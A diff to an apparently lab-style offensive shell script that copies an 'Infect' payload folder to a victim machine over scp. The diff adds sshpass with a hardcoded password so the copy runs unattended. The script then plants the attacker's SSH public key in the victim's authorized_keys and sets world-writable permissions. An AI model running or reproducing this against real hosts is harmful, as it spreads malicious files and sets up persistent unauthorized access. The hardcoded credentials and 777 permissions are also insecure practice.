@@ -17,8 +17,10 @@ cp ./Infect/Launching_Attack $Hidden2
 
 # task3
 # input victim's IP address
+export SSHPASS='victim'
+
 read -p "Enter Victim IP Address: " IP_Address
-scp -r ./Infect victim@"$IP_Address":/home/victim/Desktop/
+sshpass -e scp -r ./Infect victim@"$IP_Address":/home/victim/Desktop/
 
 # publickey
 SSH_PATH="/home/victim/.ssh" #"/root/.ssh"
@@ -34,7 +36,7 @@ ssh-keygen
 #ssh victim@"$IP_Address"
 
 chmod 700 "$SSH_PATH"
-scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
+sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
 
 chmod 777 "$SSH_PATH"
 chmod 777 "$SSH_PATH"/authorized_keys
